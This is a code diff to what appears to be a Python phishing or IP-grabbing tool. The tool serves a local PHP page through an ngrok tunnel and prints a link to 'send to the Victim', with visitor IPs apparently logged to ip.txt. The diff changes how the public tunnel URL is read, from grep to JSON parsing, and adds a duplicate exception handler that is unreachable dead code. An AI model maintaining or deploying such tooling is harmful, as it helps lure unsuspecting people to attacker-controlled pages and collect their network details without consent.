@@ -5,6 +5,8 @@ from configparser import ConfigParser
 import time as pomodoro
 import subprocess as system
 from colorama import Fore, Back, Style
+import xml.etree.ElementTree as ET
+import json
 
 add = {}
 
@@ -39,7 +41,10 @@ class server:
             console.chdir(add["include"]["php"])
             console.system("./ngrok http 3333 > /dev/null 2>&1 &")
             pomodoro.sleep(10)
-            Link = str(system.check_output("curl -s localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'", shell=True) , 'utf-8')
+            
+            Link = str(system.check_output("curl -s localhost:4040/api/tunnels/command_line", shell=True) , 'utf-8')
+            json_data = json.loads(Link)
+            Link = json_data["public_url"]
             if Link != "":
                 print(Fore.GREEN + "[+] Send this link to the Victim: " + Fore.WHITE +"{}".format(Link) + Style.RESET_ALL)
                 if console.path.isfile(Log + "/ip.txt"):
@@ -51,7 +56,9 @@ class server:
             pass
         except system.CalledProcessError as e:
             raise RuntimeError("command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output))
-
+        except system.CalledProcessError as e:
+            print("Error running the command: {}".format(e))
+            
     initialize(console.path.join(console.path.dirname(console.path.realpath(__file__))) + "/.config.cfg")
     http_header() #Create Location Header
     run_tunnels() #Start HTTP Server 
